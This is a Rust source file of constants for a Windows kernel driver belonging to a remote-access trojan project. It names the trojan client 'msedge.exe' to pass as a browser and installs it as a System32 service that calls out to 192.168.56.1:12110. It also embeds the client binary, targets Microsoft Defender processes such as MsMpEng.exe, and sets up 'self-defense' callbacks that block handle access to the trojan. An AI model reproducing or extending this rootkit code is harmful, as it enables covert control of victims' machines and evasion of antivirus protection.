use alloc::collections::BTreeSet;
use core::ffi::c_void;
use core::ptr;
use core::sync::atomic::AtomicPtr;

use aho_corasick::AhoCorasick;
use const_format::formatcp;
use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
use wdk_sys::{DEVICE_OBJECT, DRIVER_OBJECT, HANDLE};
use widestring::{U16CStr, u16cstr};

use crate::wrappers::lock::SpinLock;

pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
pub const RAT_CLIENT_SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
    "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{RAT_CLIENT_SERVICE_NAME}"
));

pub const MS_DEFENDER_PROCESS_PATTERN: &[&U16CStr] = &[
    // u16cstr!("System32\\smartscreen.exe"),
    u16cstr!("System32\\SecurityHealthService.exe"),
    // u16cstr!("Windows Defender\\MpCmdRun.exe"),
    u16cstr!("Windows Defender\\MsMpEng.exe"),
];

/// Self-defense pattern to construct the Aho-Corasick automaton.
///
/// The object callback protects against handle creation of any process whose image path
/// matches this pattern.
pub const RAT_CLIENT_OBJ_PATH_SELF_DEFENSE: &U16CStr = u16cstr!("System32\\msedge.exe");

pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!("\\SystemRoot\\System32\\msedge.exe");
pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(formatcp!(
    "\"%SystemRoot%\\System32\\msedge.exe\" --host 192.168.56.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
));

pub const ALTITUDE: &U16CStr = u16cstr!("360000");

pub const DOS_NAME: &U16CStr = u16cstr!(formatcp!("\\DosDevices\\{RAT_CLIENT_SERVICE_NAME}"));
pub const DEVICE_NAME: &U16CStr = u16cstr!(formatcp!("\\Device\\{RAT_CLIENT_SERVICE_NAME}"));

#[cfg(debug_assertions)]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe");

#[cfg(not(debug_assertions))]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");

pub static MS_DEFENDER_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
pub static OBJ_PATH_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
pub static PROCESS_NOTIFY_ROUTINE: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

pub static SELF_DEFENSE_PIDS: AtomicPtr<SpinLock<BTreeSet<HANDLE>>> =
    AtomicPtr::new(ptr::null_mut());

pub static ORIGINAL_DRIVER_OBJECT: AtomicPtr<DRIVER_OBJECT> = AtomicPtr::new(ptr::null_mut());
pub static RAT_DEVICE_OBJECT: AtomicPtr<DEVICE_OBJECT> = AtomicPtr::new(ptr::null_mut());
